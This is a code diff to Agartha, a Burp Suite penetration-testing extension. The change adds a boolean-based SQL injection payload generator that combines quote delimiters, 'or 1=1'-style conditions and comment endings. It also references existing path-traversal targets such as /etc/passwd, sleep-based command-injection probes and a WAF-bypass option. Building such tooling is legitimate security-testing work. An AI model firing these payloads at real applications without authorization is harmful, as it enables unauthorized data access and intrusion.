@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.11"
+VERSION = "0.12"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -24,8 +24,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
-        self._callbacks.setExtensionName("Agartha {RCE|LFI|Auth}")
-        print "Version " + VERSION + " is just loaded.\n\nAgartha is a payload generator for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Control\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"        
+        self._callbacks.setExtensionName("Agartha {RCE|LFI|Auth|SQLi|JS}")
+        print "Version " + VERSION + " is just loaded.\n\nAgartha is a payload generator for:\n\t\t* Local File Inclusion (LFI), Directory Traversal,\n\t\t* Remote Code Execution (RCE),\n\t\t* Authorization/Authentication Control,\n\t\t* Boolean-Based SQL Injection,\n\t\t* Http Request to Javascript.\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha"        
         self._MainTabs = JTabbedPane()
         self._tabDictUI()
         self._tabAuthUI()
@@ -400,6 +400,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         #top panel
         self._txtDefaultLFI="Example: 'etc/passwd', 'C:\\boot.ini'"
         self._txtDefaultRCE="Examples: $'sleep 1000', >'timeout 1000'"
+        self._txtDefaultSQLi="No input is needed to supply!"
         self._txtCheatSheetLFI=""
         self._txtCheatSheetLFI+="Directory Traversal Linux\t\t\tDirectory Traversal Windows\n"
         self._txtCheatSheetLFI+="\t/etc/passwd\t\t\t\tC:\\boot.ini\n"
@@ -424,6 +425,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtDictParam = JTextField(self._txtDefaultLFI, 30)
         self._rbDictLFI = JRadioButton('DT/LFI', True, itemStateChanged=self.funcRBSelection);
         self._rbDictRCE = JRadioButton('RCE', itemStateChanged=self.funcRBSelection)
+        self._rbDictSQLi = JRadioButton('SQLi', itemStateChanged=self.funcRBSelection)
         self._rbDictXXE = JRadioButton('XXE', itemStateChanged=self.funcRBSelection)
         self._rbDictXSS = JRadioButton('XSS', itemStateChanged=self.funcRBSelection)
         self._rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
@@ -431,6 +433,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         _rbPanel = JPanel()
         _rbPanel.add(self._rbDictLFI)
         _rbPanel.add(self._rbDictRCE)
+        _rbPanel.add(self._rbDictSQLi)
         #_rbPanel.add(self._rbDictCheatSheet)
         #_rbPanel.add(self._rbDictXXE)
         #_rbPanel.add(self._rbDictXSS)
@@ -438,14 +441,15 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         _rbGroup = ButtonGroup()
         _rbGroup.add(self._rbDictLFI)
         _rbGroup.add(self._rbDictRCE)
+        _rbGroup.add(self._rbDictSQLi)
         _rbGroup.add(self._rbDictCheatSheet)
         _rbGroup.add(self._rbDictXXE)
         _rbGroup.add(self._rbDictXSS)
         _rbGroup.add(self._rbDictFuzzer)
         self._cbDictEncoding= JCheckBox('Waf Bypass', True)
         self._cbDictEquality= JCheckBox(')', False)
-        self._cbDictDepth = JComboBox(list(range(0, 30)))
-        self._cbDictDepth.setSelectedIndex(10)
+        self._cbDictDepth = JComboBox(list(range(0, 20)))
+        self._cbDictDepth.setSelectedIndex(5)
         _cbDictDepthPanel = JPanel()
         _cbDictDepthPanel.add(self._cbDictDepth)
         
@@ -484,7 +488,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcGeneratePayload(self, ev):
         self._lblStatusLabel.setForeground (Color.red)
-        if not self.isValid():
+        if self._rbDictSQLi.isSelected():            
+            self._txtDictParam.setText(self._txtDefaultSQLi)
+        elif not self.isValid():
             self._lblStatusLabel.setText("input is not valid. ")
             if self._rbDictLFI.isSelected():
                 self._lblStatusLabel.setText("File "+ self._lblStatusLabel.text + self._txtDefaultLFI)
@@ -493,6 +499,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 self._lblStatusLabel.setText("Remote code " +self._lblStatusLabel.text + self._txtDefaultRCE)
                 self._txtDictParam.setText("sleep 1000")
             return 
+
         self._lblStatusLabel.setForeground (Color.black)
         self._txtDictParam.text = self._txtDictParam.text.strip()
         self._tabDictResultDisplay.setText("")
@@ -501,6 +508,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             self.funcRCE(self)
         if self._rbDictLFI.isSelected():
             self.funcLFI(self)
+        if self._rbDictSQLi.isSelected():
+            self.funcSQLi(self)            
         return
        
     def isValid(self):
@@ -529,6 +538,12 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         elif self._rbDictRCE.isSelected():
             self._txtDictParam.setText(self._txtDefaultRCE)
             self._tabDictResultDisplay.setText(self._txtCheatSheetRCE)
+        #_V
+        elif self._rbDictSQLi.isSelected():
+            self._txtDictParam.setText(self._txtDefaultSQLi)
+            #self._tabDictResultDisplay.setText(self._txtCheatSheetSQLi)
+            #self._tabDictResultDisplay.setText("sil")
+            self.funcSQLi(self)
         elif self._rbDictCheatSheet.isSelected():
             self._tabDictResultDisplay.setText(self._txtCheatSheet)
             self._lblStatusLabel.setText('')
@@ -654,6 +669,41 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         listLFI.sort(reverse=True)
         self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
         self._lblStatusLabel.setText('File dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listLFI)) + ' result. Please make sure payload encoding is disabled, unless you are sure what you are doing.') 
+        return
+
+    def funcSQLi(self, ev):
+        listSQLi = []
+        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
+        delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
+        delimeterEnds = ["", " --", " #", ";", "; --", "; #"]
+
+        for delimeterStart in delimeterStarts:
+            for delimeterBoolean in delimeterBooleans:
+                for delimeterEnd in delimeterEnds:
+                    listSQLi.append(delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")
+
+        delimeterStarts = ["'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
+        delimeterEnds = [" --", " #", "; --", "; #"]
+        for delimeterStart in delimeterStarts:
+            for delimeterEnd in delimeterEnds:
+                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + "\n")
+                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + "\n")
+                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
+                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
+                
+        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
+        delimeterEnds = ["", " --", " #", ";", "; --", "; #"]
+        for delimeterStart in delimeterStarts:
+            for delimeterEnd in delimeterEnds:
+                listSQLi.append(delimeterStart + delimeterEnd + "\n")
+                listSQLi.append(delimeterStart + delimeterEnd + "\n")
+
+        listSQLi = [elem for elem in listSQLi if elem.strip()]
+        listSQLi = list(set(listSQLi))
+        listSQLi.sort(reverse=True)
+
+        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
+        self._lblStatusLabel.setText('Boolean based Sql Injection dictionary generation is returned with '+ str(len(listSQLi)) + ' result.') 
         return
 
     def getTabCaption(self):
